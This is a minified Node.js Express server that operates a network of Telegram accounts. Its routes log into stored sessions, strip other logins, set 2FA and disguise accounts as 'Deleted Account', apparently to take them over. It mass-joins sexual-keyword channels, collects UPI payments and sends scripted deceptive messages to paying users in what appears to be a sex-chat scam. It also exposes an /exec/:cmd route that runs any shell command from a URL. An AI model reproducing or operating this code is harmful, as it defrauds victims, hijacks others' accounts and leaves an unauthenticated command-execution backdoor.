s=e.params.limit?e.params.limit:30,a=e.params.skip?e.params.skip:20,i=e.query?.k,c=o.getInstance(),l=await c.getActiveChannels(parseInt(s),parseInt(a),[i],[],"channels");let r="joinchannel:";for(const e of l)r=r+(e?.username?.startsWith("@")?e.username:`@${e.username}`)+"|";t.send(r)}));let E=Date.now();C.get("/getdata",(async(e,t,n)=>{O.getinstance(),Date.now()>E&&(E=Date.now()+3e5,Array.from(A.values()).map((async e=>{await y(`${e.url}markasread`)}))),t.setHeader("Content-Type","text/html");let s="<html><head></head><body>";s+=await async function(){const e=await createInitializedObject(),t=await o.getInstance();let n=await t.readStats();for(const t of n){const{count:n,newUser:s,payAmount:a,demoGivenToday:o,demoGiven:i,profile:c,client:l,name:r,secondShow:d}=t;if(l&&e[l.toUpperCase()]){const t=e[l.toUpperCase()];t.totalCount+=n,t.totalPaid+=a>0?1:0,t.totalOldPaid+=a>0&&!s?1:0,t.oldPaidDemo+=o&&!s?1:0,t.totalpendingDemos+=a>25&&!i?1:0,t.oldPendingDemos+=a>25&&!i&&!s?1:0,a>25&&!i&&(t.names=t.names+` ${r} |`),i&&(a>90&&!d||a>150&&d)&&(t.fullShowPPl++,t.fullShowNames=t.fullShowNames+` ${r} |`),s&&(t.totalNew+=1,t.totalNewPaid+=a>0?1:0,t.newPaidDemo+=o?1:0,t.newPendingDemos+=a>25&&!i?1:0)}}const s=Object.entries(e);s.sort(((e,t)=>t[1].totalpendingDemos-e[1].totalpendingDemos));let a="";for(const[e,t]of s)a+=`${e.toUpperCase()} : <b>${t.totalpendingDemos}</b> | ${t.names}<br>`;s.sort(((e,t)=>t[1].fullShowPPl-e[1].fullShowPPl));let i="";for(const[e,t]of s)i+=`${e.toUpperCase()} : <b>${t.fullShowPPl}</b> |${t.fullShowNames}<br>`;return`<div>\n      <div style="display: flex; margin-bottom: 60px">\n        <div style="flex: 1;">${a}</div>\n        <div style="flex: 1; ">${i}</div>\n      </div>\n      <div style="display: flex;">\n        <div style="flex: 1; " >${await q()}</div>\n      </div>\n    </div>`}(),s+="</body></html>",s+='<script>\n              console.log("hii");\n              setInterval(() => {\n                window.location.reload();\n              }, 20000);\n          <\/script>',t.send(s)})),C.get("/getdata2",(async(e,t,n)=>{O.getinstance(),t.send("Hello World!"),n()}),(async(e,t)=>{const n=Array.from(A.values());for(let e=0;e<n.length;e++){const t=n[e];await y(`${t.url}getDemostat2`),await h(1e3)}})),C.get("/getAllIps",(async(e,t,n)=>{O.getinstance(),t.send("Hello World!"),n()}),(async(e,t)=>{const n=Array.from(A.values());for(let e=0;e<n.length;e++){const t=n[e];try{console.log(t.clientId);const e=await y(`${t.url}getip`);console.log(e.data)}catch(e){}}})),C.get("/refreshupis",(async(e,t,n)=>{O.getinstance(),t.send("Hello World!"),n()}),(async(e,t)=>{const n=Array.from(A.values());for(let e=0;e<n.length;e++){const t=n[e];await y(`${t.url}refreshupis`)}})),C.get("/getuserdata",(async(e,t,n)=>{O.getinstance(),t.send("Hello World!"),n()}),(async(e,t)=>{const n=Array.from(A.values());for(let e=0;e<n.length;e++){const t=n[e];await y(`${t.url}getuserstats`),await h(1e3)}})),C.get("/getuserdata2",(async(e,t,n)=>{O.getinstance(),t.send("Hello World!"),n()}),(async(e,t)=>{const n=Array.from(A.values());for(let e=0;e<n.length;e++){const t=n[e];await y(`${t.url}getuserstats2`),await h(1e3)}})),C.get("/restartall",(async(e,t,n)=>{O.getinstance(),t.send("Hello World!"),n()}),(async(e,t)=>{Array.from(A.values()).map((async e=>{await y(`${e.deployKey}`)}))})),C.get("/sendtoall",(async(e,t,n)=>{O.getinstance(),console.log("Received sendtoall request"),t.send("Hello World!"),n()}),(async(e,t)=>{const n=e.query;let s="";Object.keys(e.query).map((e=>{s+=`${n[e]}/`})),console.log(s);for(const e of A.values()){const t=`${e.url}${s}`;console.log(t),await h(1e3),await y(t)}})),C.get("/usermap",(async(e,t)=>{O.getinstance(),console.log("Received Usermap request"),t.json(Array.from(A.values()))})),C.get("/getbufferclients",(async(e,t)=>{const n=o.getInstance(),s=[];(await n.readBufferClients({})).forEach((e=>{s.push(e.mobile)})),t.json(s)})),C.get("/clients",(async(e,t)=>{O.getinstance(),console.log("Received Client request"),t.json(P)})),C.get("/keepready2",(async(e,t,n)=>{O.getinstance(),console.log("Received keepready2 request"),t.send(`Responding!!\nMsg = ${e.query.msg}`),n()}),(async(e,t)=>{const n=e.query.msg;console.log("Msg2 = ",n),Array.from(A.values()).map((async e=>{await y(`${e.url}resptopaid2?msg=${n||"Oye..."}`),await y(`${e.url}getDemostats`)}));const s=o.getInstance();await s.clearStats()})),C.get("/keepready",(async(e,t,n)=>{O.getinstance(),console.log("Received Keepready request");const s=encodeURIComponent("Dont Speak Okay!!\n**I am in Bathroom**\n\nMute yourself!!\n\nI will show you Okay..!!"),a="dns"==e.query.msg.toLowerCase()?s:e.query.msg;Array.from(A.values()).map((async e=>{await y(`${e.url}resptopaid?msg=${a||"Oye..."}`)}));const i=o.getInstance();await i.clearStats(),t.send(`Responding!!\nMsg = ${a}`)})),C.get("/asktopay",(async(e,t,n)=>{O.getinstance(),console.log("Received AsktoPay request"),t.send("Asking Pppl"),n()}),(async(e,t)=>{const n=e.query.msg;console.log("Msg = ",n),Array.from(A.values()).map((async e=>{await y(`${e.url}asktopay`)}))}));let T=Date.now();C.get("/calltopaid",(async(e,t,n)=>{O.getinstance(),console.log("Received Call request"),t.send("Asking Pppl"),n()}),(async(e,t)=>{const n=e.query.msg;console.log("Msg = ",n),Date.now()>T&&(T=Date.now()+6e5,Array.from(A.values()).map((async e=>{await y(`${e.url}calltopaid`)})))})),C.get("/markasread",(async(e,t,n)=>{O.getinstance(),console.log("Received MarkasRead Req"),t.send("Hello World!"),n()}),(async(e,t)=>{const n=e.query.all;Date.now()>E&&(E=Date.now()+3e5,console.log("proceeding with all = ",n),Array.from(A.values()).map((async e=>{await y(`${e.url}markasread?${n?"all=true":""}`)})))})),C.get("/setactiveqr",(async(e,t,n)=>{O.getinstance(),t.send("Hello World!"),n()}),(async(e,t)=>{const n=e.query.upi;console.log("upi = ",n),Array.from(A.values()).map((async e=>{await y(`${e.url}setactiveqr?upi=${n}`)}))})),C.get("/getUpiId",(async(e,t)=>{O.getinstance();const n=e.query.app?e.query.app:"paytm3",s=o.getInstance(),a=await s.getupi(n);t.send(a)})),C.get("/getAllUpiIds",(async(e,t)=>{O.getinstance(),t.json(S)})),C.post("/getAllUpiIds",(async(e,t,n)=>{const s=e.body;O.getinstance();const a=o.getInstance(),i=await a.updateUpis(s);t.json(i),n()}),(async()=>{const e=Array.from(A.values());for(let t=0;t<e.length;t++){const n=e[t];await y(`${n.url}refreshupis`)}})),C.get("/getUserConfig",(async(e,t)=>{const n=e.query;O.getinstance();const s=o.getInstance(),a=await s.getUserConfig(n);t.json(a)})),C.post("/getUserConfig",(async(e,t)=>{const n=e.query,s=e.body;O.getinstance();const a=o.getInstance(),i=await a.updateUserConfig(n,s);await k(),t.json(i)})),C.get("/builds",(async(e,t)=>{O.getinstance();const n=o.getInstance(),s=await n.getBuilds();console.log(s),t.json(s)})),C.post("/builds",(async(e,t)=>{const n=e.body;O.getinstance();const s=o.getInstance();console.log(n);const a=await s.updateBuilds(n);t.json(a)})),C.get("/getAllUserClients",(async(e,t)=>{O.getinstance();const n=o.getInstance(),s=await n.getAllUserClients(),a=[];s.map((e=>{a.push(e.clientId)})),t.send(a)})),C.get("/getTgConfig",(async(e,t)=>{O.getinstance();const n=o.getInstance(),s=await n.getTgConfig();t.json(s)})),C.get("/updateActiveChannels",(async(e,t)=>{O.getinstance();const n=o.getInstance();await n.updateActiveChannels(),t.send("ok")})),C.get("/getCurrentActiveUniqueChannels",(async(e,t)=>{O.getinstance();const n=o.getInstance(),s=await n.getCurrentActiveUniqueChannels();t.json({length:s.length,data:s})})),C.post("/getTgConfig",(async(e,t,n)=>{const s=e.body;O.getinstance();const a=o.getInstance(),i=await a.updateUpis(s);t.json(i),n()}),(async()=>{const e=Array.from(A.values());for(let t=0;t<e.length;t++){const n=e[t];await y(`${n.url}refreshupis`)}})),C.get("/lastpings",(async(e,t,n)=>{O.getinstance();let s="<html><head><style>pre { font-size: 18px; }</style></head><body><pre>";const a=Array.from(A.values());for(let e=0;e<a.length;e++){const t=a[e];s+=`${t.clientId}  :  ${Number(((Date.now()-t.lastPingTime)/6e4).toFixed(2))}\n`}s+="</pre></body></html>",t.setHeader("Content-Type","text/html"),t.send(s)})),C.get("/lastpingsjson",(async(e,t,n)=>{O.getinstance();let s="<html><head><style>pre { font-size: 18px; }</style></head><body><pre>";for(const e in $)s+=`${e}  :  ${Number(((Date.now()-$[e])/6e4).toFixed(2))}\n`;s+="</pre></body></html>",t.setHeader("Content-Type","text/html"),t.send(s)})),C.get("/exitglitches",(async(e,t,n)=>{t.send("ok"),n()}),(async()=>{const e=Array.from(A.values());for(let t=0;t<e.length;t++){const n=e[t];n.url.toLowerCase().includes("glitch")&&await y(`${n.url}exit`)}})),C.get("/exitprimary",(async(e,t,n)=>{t.send("ok"),n()}),(async()=>{const e=Array.from(A.values());for(let t=0;t<e.length;t++){const n=e[t];n.clientId.toLowerCase().includes("1")&&await y(`${n.url}exit`)}})),C.get("/exitsecondary",(async(e,t,n)=>{t.send("ok"),n()}),(async()=>{const e=Array.from(A.values());for(let t=0;t<e.length;t++){const n=e[t];n.clientId.toLowerCase().includes("2")&&await y(`${n.url}exit`)}})),C.get("/connectclient/:number",(async(e,t)=>{const n=e.params?.number,s=o.getInstance(),a=await s.getUser({mobile:n});a?c(a.mobile)?t.send("Client Already existing"):await r(a.mobile,a.session)?t.send("client created"):t.send("client EXPIRED"):t.send("User Does not exist")})),C.get("/joinchannels/:number/:limit/:skip",(async(e,t,n)=>{t.send("joiningChannels"),n()}),(async(e,t)=>{try{const t=e.params?.number,n=e.params.limit?e.params.limit:30,s=e.params.skip?e.params.skip:20,a=e.query?.k,l=o.getInstance(),d=await l.getUser({mobile:t});if(!c(d.mobile))if(await r(d.mobile,d.session,!1)){const e=await i(d.mobile),t=await e.channelInfo(!0),o=["wife","adult","lanj","lesb","paid","randi","bhab","boy","girl"],c=await l.getActiveChannels(parseInt(n),parseInt(s),a?[a]:o,t.ids,"channels");console.log("DbChannelsLen: ",c.length);let r="";for(const e of c)r=r+(e?.username?.startsWith("@")?e.username:`@${e.username}`)+"|";await e.removeOtherAuths(),e.joinChannels(r)}else console.log("Client Does not exist!")}catch(e){console.log("Some Error: ",e)}})),C.get("/set2fa/:number",(async(e,t,n)=>{t.send("Setting 2FA"),n()}),(async(e,t)=>{try{const t=e.params?.number,n=o.getInstance(),s=await n.getUser({mobile:t});if(!c(s.mobile)){const e=await r(s.mobile,s.session),t=await i(s.mobile);e?await t.set2fa():console.log("Client Does not exist!")}}catch(e){console.log("Some Error: ",e.code)}})),C.get("/setpp/:number/:name",(async(e,t,n)=>{t.send("Setting 2FA"),n()}),(async(e,t)=>{try{const t=e.params?.number,n=e.params?.name,s=o.getInstance(),a=await s.getUser({mobile:t});if(!c(a.mobile)){const e=await r(a.mobile,a.session),t=await i(a.mobile);e?(await b.getInstance(n),await h(2e3),await t.updateProfilePic("./dp1.jpg"),await h(1e3),await t.updateProfilePic("./dp2.jpg"),await h(1e3),await t.updateProfilePic("./dp3.jpg"),await h(1e3)):console.log("Client Does not exist!")}}catch(e){console.log("Some Error: ",e.code)}})),C.get("/SetAsBufferClient/:number",(async(e,t,n)=>{t.send("Updating Name"),n()}),(async(e,t)=>{try{const t=e.params?.number,n=o.getInstance(),s=await n.getUser({mobile:t});if(console.log(s),!c(s.mobile)){const e=await r(s.mobile,s.session),t=await i(s.mobile);e?(await t.set2fa(),await h(3e4),await t.updateUsername(),await h(5e3),await t.updatePrivacyforDeletedAccount(),await h(5e3),await t.updateProfile("Deleted Account","Deleted Account"),await h(5e3),await t.deleteProfilePhotos(),await h(5e3)):console.log("Client Does not exist!")}}catch(e){console.log("Some Error: ",e)}})),C.get("/updatePrivacy/:number",(async(e,t,n)=>{t.send("Updating Privacy"),n()}),(async(e,t)=>{try{const t=e.params?.number,n=o.getInstance(),s=await n.getUser({mobile:t});if(console.log(s),!c(s.mobile)){const e=await r(s.mobile,s.session),t=await i(s.mobile);e?await t.updatePrivacy():console.log("Client Does not exist!")}}catch(e){console.log("Some Error: ",e)}})),C.get("/UpdateUsername/:number",(async(e,t,n)=>{t.send("Updating Privacy"),n()}),(async(e,t)=>{try{const t=e.params?.number,n=e.query?.username,s=o.getInstance(),a=await s.getUser({mobile:t});if(console.log(a),!c(a.mobile)){const e=await r(a.mobile,a.session),t=await i(a.mobile);e?await t.updateUsername(n):console.log("Client Does not exist!")}}catch(e){console.log("Some Error: ",e)}})),C.get("/UpdatePP/:number",(async(e,t,n)=>{t.send("Updating profile Pic"),n()}),(async(e,t)=>{try{const t=e.params?.number,n=o.getInstance(),s=await n.getUser({mobile:t});if(console.log(s),!c(s.mobile)){const e=await r(s.mobile,s.session),t=await i(s.mobile);e?await t.updateProfilePic("./qrcode.jpg"):console.log("Client Does not exist!")}}catch(e){console.log("Some Error: ",e)}})),C.get("/UpdateName/:number",(async(e,t,n)=>{t.send("Updating Name"),n()}),(async(e,t)=>{try{const t=e.params?.number,n=o.getInstance(),s=await n.getUser({mobile:t});if(console.log(s),!c(s.mobile)){const e=await r(s.mobile,s.session),t=await i(s.mobile);e?await t.updateProfile("Deleted Account","Deleted Account"):console.log("Client Does not exist!")}}catch(e){console.log("Some Error: ",e)}})),C.get("/deletepp/:number",(async(e,t,n)=>{t.send("Updating Name"),n()}),(async(e,t)=>{try{const t=e.params?.number,n=o.getInstance(),s=await n.getUser({mobile:t});if(console.log(s),!c(s.mobile)){const e=await r(s.mobile,s.session),t=await i(s.mobile);e?await t.deleteProfilePhotos():console.log("Client Does not exist!")}}catch(e){console.log("Some Error: ",e)}})),C.get("/removeAuths/:number",(async(e,t)=>{const n=e.params?.number,s=o.getInstance(),a=await s.getUser({mobile:n});if(c(a.mobile))t.send("Client Already existing");else{await r(a.mobile,a.session);const e=await i(a.mobile);e?(await e.removeOtherAuths(),t.send("Auths Removed")):t.send("client EXPIRED")}})),C.get("/exec/:cmd",(async(e,t,n)=>{let s=e.params.cmd;console.log("executing: ",s);try{t.send(console.log(f(s).toString()))}catch(e){console.log(e)}})),C.get("/blockusers/:number",(async(e,t)=>{const n=e.params?.number,s=o.getInstance(),a=await s.getUser({mobile:n});if(c(a.mobile))t.send("Client Already existing");else{await r(a.mobile,a.session);const e=await i(a.mobile);e?(await e.blockAllUsers(),t.send("Blocked Users")):t.send("client EXPIRED")}})),C.get("/getAuths/:number",(async(e,t)=>{const n=e.params?.number,s=o.getInstance(),a=await s.getUser({mobile:n});if(c(a.mobile))t.send("Client Already existing");else{await r(a.mobile,a.session);const e=await i(a.mobile);e?t.json(await e.getAuths()):t.send("client EXPIRED")}})),C.get("/connectcliens/:limit/:skip",(async(e,t)=>{const n=e.params?.limit,s=e.params?.skip,a=o.getInstance(),i=await a.getUsersFullData(parseInt(n),parseInt(s));let l="<html><head><style>pre { font-size: 18px; }</style></head><body><pre>";for(const e of i)c(e.mobile)||(l+=await r(e.mobile,e.session)?`${e.mobile} : true\n\n`:`${e.mobile} : false\n\n`);l+="</pre></body></html>",console.log("data: ",l),t.setHeader("Content-Type","text/html"),t.send(l)})),C.get("/disconnectclients",(async(e,t,n)=>{t.send("Hello World!"),n()}),(async(e,t)=>{await l()})),C.get("/promoteStats",(async(e,t,n)=>{const s=await async function(){let e="<html><head><style>pre { font-size: 18px; }</style></head><body><pre>";return e+=await q(),e+="</pre></body></html>",e}();t.setHeader("Content-Type","text/html"),t.send(s)})),C.get("/getusers/:limit/:skip",(async(e,t,n)=>{const s=parseInt(e.params?.limit?e.params?.limit:10),a=parseInt(e.params?.skip?e.params?.skip:10),i=o.getInstance(),c=await i.getUsers(s,a);t.json(c)})),C.get("/getlastmsgs/:number/:limit",(async(e,t,n)=>{const s=parseInt(e.params?.limit?e.params?.limit:10),a=e.params?.number;console.log(a,s);const o=i(a);if(await o.client.connect(),console.log(o.client.connected),o){const e=await(o?.getLastMsgs(s,a));t.send(e)}else t.send("client is undefined")})),C.get("/getchannels",(async(e,t,n)=>{O.getinstance(),t.send("Hello World!"),n()}),(async(e,t)=>{const n=Array.from(A.values());for(let e=0;e<n.length;e++){const t=n[e];await y(`${t.url}getchannels`),await h(1e3)}})),C.get("/restart",(async(e,t,n)=>{t.send("Hello World!"),n()}),(async(e,t)=>{const n=e.query.userName;O.getinstance().restart(n.toLowerCase())})),C.get("/receiveNumber/:num",(async(e,t,n)=>{t.send("Hello World!"),n()}),(async(e,n)=>{try{const n=e.query.userName,s=parseInt(e.params.num),a=A.get(n.toLowerCase());a&&await t.get(`${a.url}receiveNumber/${s}`,{timeout:7e3})}catch(e){console.log("Some Error: ",e.code)}})),C.get("/tgclientoff/:num",(async(e,t,n)=>{t.send("Hello World!"),n()}),(async(e,n)=>{try{const n=e.query.userName,s=e.params.num;console.log(new Date(Date.now()).toLocaleString("en-IN",a),"Req receved from: ",e.query.url," : ",n," - ",s);try{const e=A.get(n.toLowerCase()),a=e?.url;if(a){const o=await t.get(`${a}getprocessid`,{timeout:1e4});o.data.ProcessId===s?(A.set(n.toLowerCase(),{...e,timeStamp:Date.now(),downTime:0,lastPingTime:Date.now()}),function(e,t){const n=D.findIndex((t=>t.userName===e));-1!==n?D[n].processId=t:D.push({userName:e,processId:t})}(n,s)):(console.log(`Actual Process Id from ${a}getprocessid : `,o.data.ProcessId),console.log("Request received from Unknown process"))}}catch(e){console.log("Some Error: ",e)}}catch(e){console.log("Some Error: ",e)}})),C.get("/joinchannel",(async(e,t,n)=>{t.send("Hello World!"),n()}),(async(e,t)=>{try{const t=e.query.userName;if(t){const e=A.get(t.toLowerCase());e?R(e):console.log(new Date(Date.now()).toLocaleString("en-IN",a),`User ${t} Not exist`)}else for(const e of A.values())try{R(e)}catch(e){console.log("Some Error: ",e.code)}}catch(e){console.log("Some Error: ",e)}})),C.get("/joinchannelBf",(async(e,t,n)=>{t.send("Hello World!"),n()}),(async(e,t)=>{try{B()}catch(e){console.log("Some Error: ",e.code)}})),C.get("/requestcall",(async(e,t,n)=>{t.send("Hello World!"),n()}),(async(e,n)=>{try{const n=e.query.userName,s=e.query.chatId,a=A.get(n.toLowerCase());console.log(`Call Request Recived: ${n} | ${s}`),a?setTimeout((async()=>{try{(await t.get(`${a.url}requestcall/${s}`,{timeout:7e3})).data?(console.log(`Call Request Sent: ${n} | ${s}`),setTimeout((async()=>{try{await t.get(`${a.url}requestcall/${s}`,{timeout:7e3}),setTimeout((async()=>{await t.get(`${a.url}sendMessage/${s}?msg=Not Connecting!!, Don't worry I will try again in sometime!! okay!!`,{timeout:7e3})}),18e4)}catch(e){console.log(e)}}),12e4)):console.log(`Call Request Sent Not Sucess: ${n} | ${s}`)}catch(e){console.log("Failed",a)}}),18e4):console.log("USer not exist!!")}catch(e){console.log("Some Error: ",e.code)}})),C.listen(8e3,(async()=>{console.log("Example app listening at http://localhost:8000")}));class O{static instance=void 0;constructor(){this.main()}static getinstance(){return O.instance||(console.log("creating instance-------"),O.instance=new O),O.instance}main(){}async restart(e,n){const s=A.get(e);console.log(s,e);const a=s?.url;if(a){A.set(e,{...s,timeStamp:Date.now()});try{try{console.log("Checking Health");const e=await t.get(`${a} checkHealth`,{timeout:1e4});if(200===e.status||201===e.status)if(e.data.status===U||"WAIT"===e.data.status)console.log(e.data.userName,": All good");else{console.log(e.data.userName,": DIAGNOSE - HealthCheck - ",e.data.status),await t.get(`${x()}& text=${e.data.userName.toUpperCase()}: HealthCheckError - ${e.data.status} `);try{const e=await t.get(`${a} tryToConnect / ${n} `,{timeout:1e4});console.log(e.data.userName,": RetryResp - ",e.data.status),await t.get(`${x()}& text=${e.data.userName.toUpperCase()}: RetryResponse - ${e.data.status} `)}catch(e){console.log(a,"CONNECTION RESTART FAILED!!")}}else console.log(a,"is unreachable!!")}catch(e){console.log(a,"is unreachable!!")}}catch(e){console.log(e)}}else console.log("url is undefined")}}async function R(e){try{let t=await y(`${e.url}channelinfo`,{timeout:2e5});if(console.log(t),await y(`${x()}&text=ChannelCount SendTrue - ${e.clientId}: ${t.data.canSendTrueCount}`),t?.data?.canSendTrueCount&&t?.data?.canSendTrueCount<250){await y(`${x()}&text=Started Joining Channels- ${e.clientId}`);const n=["wife","adult","lanj","servic","paid","randi","bhab","boy","girl"],s=o.getInstance(),a=await s.getActiveChannels(100,0,n,t.data?.ids,"activeChannels");for(const t of a)try{console.log(t.username);const n=t?.username?.replace("@","");n&&(y(`${e.url}joinchannel?username=${n}`),await h(2e5))}catch(e){console.log("Some Error: ",e)}}}catch(e){console.log(e)}}async function q(){let e="";const t=o.getInstance(),n=await t.readPromoteStats();for(const t of n)e+=`${t.client.toUpperCase()} : <b>${t.totalCount}</b>${t.totalCount>0?` | ${Number((Date.now()-t.lastUpdatedTimeStamp)/6e4).toFixed(2)}`:""}<br>`;return e}let j=[],M=[];async function L(){const e=await o.getInstance();await l(),await h(2e3);const t=await e.readBufferClients({});if(j=[],M=[],t.length<40)for(let e=0;e<40-t.length;e++)M.push(1);for(const n of t)if(console.log(n),await r(n.mobile,n.session)){const t=await i(n.mobile);if(await t.hasPassword()){const s=await t.channelInfo(!0);await e.insertInBufferClients({mobile:n.mobile,channels:s.ids.length}),console.log(n.mobile," :  ALL Good"),j.push(n.mobile)}else M.push(n.mobile),await e.deleteBufferClient(n);await t.disconnect(),await d(n.mobile),await h(2e3)}else console.log(n.mobile," :  false"),M.push(n.mobile),await e.deleteBufferClient(n),await e.deleteUser(n);console.log(M,j),await async function(){const e=await o.getInstance(),t=await e.getNewBufferClients(j);for(;M.length>0;)try{if(t.hasNext()){const n=await t.next();if(await r(n.mobile,n.session)){const t=await i(n.mobile),s=await t.hasPassword();console.log("hasPassword: ",s),s?(await e.updateUser(n,{twoFA:!0}),await t.disconnect(),await d(n.mobile)):(await t.removeOtherAuths(),await t.set2fa(),console.log("waiting for setting 2FA"),await h(35e3),await t.updateUsername(),await h(5e3),await t.updatePrivacyforDeletedAccount(),await h(5e3),await t.updateProfile("Deleted Account","Deleted Account"),await h(5e3),await t.deleteProfilePhotos(),await h(5e3),console.log("Inserting Document"),await e.insertInBufferClients(n),await t.disconnect(),await d(n.mobile),M.pop())}else await e.deleteUser(n)}else console.log("Cursor Does not have Next")}catch(e){console.error("An error occurred:",e)}setTimeout((()=>{B()}),12e4)}()}async function _(e,n){try{const s=await o.getInstance();let a=e.userName?.replace("@","");if("2"==function(e){const t=e.match(/\d+/g);return t?t.join(""):""}(n.clientId))a=(await s.getUserConfig({clientId:n.clientId.replace("2","1")})).userName;else{const e=n.clientId.replace("1","2"),o=await s.updateUserConfig({clientId:e},{mainAccount:a});if(o&&(console.log(e," -  ",o),console.log(`updated ${e}'s MainAccount with ${a}`),o.repl))try{await t.get(`${o?.repl}/exit`)}catch(e){}}const i=await s.updateUserConfig({clientId:n.clientId},{session:e.session,number:e.number?e.number:`+${e.mobile}`,userName:e.userName?.replace("@",""),mainAccount:a});if(console.log("Updated the Client Successfully",i),await s.deleteBufferClient({mobile:n.phoneNumber}),console.log(n.clientId," -  ",i),i?.repl)try{await t.get(`${i?.repl}/exit`)}catch(e){console.log(e)}await k()}catch(e){console.log(e)}}async function B(){const e=o.getInstance();await l(),await h(2e3);const t=await e.readBufferClients({channels:{$lt:150}},5);for(const n of t)if(await r(n.mobile,n.session,!1)){const t=await i(n.mobile),s=await t.channelInfo(!0),a=["wife","adult","lanj","lesb","paid","randi","bhab","boy","girl"],o=await e.getActiveChannels(150,0,a,s.ids,"channels");console.log("DbChannelsLen: ",o.length);let c="";for(const e of o)c=c+(e?.username?.startsWith("@")?e.username:`@${e.username}`)+"|";t.joinChannels(c)}}})();var a=exports;for(var o in s)a[o]=s[o];s.__esModule&&Object.defineProperty(a,"__esModule",{value:!0})})();
//# sourceMappingURL=server.js.map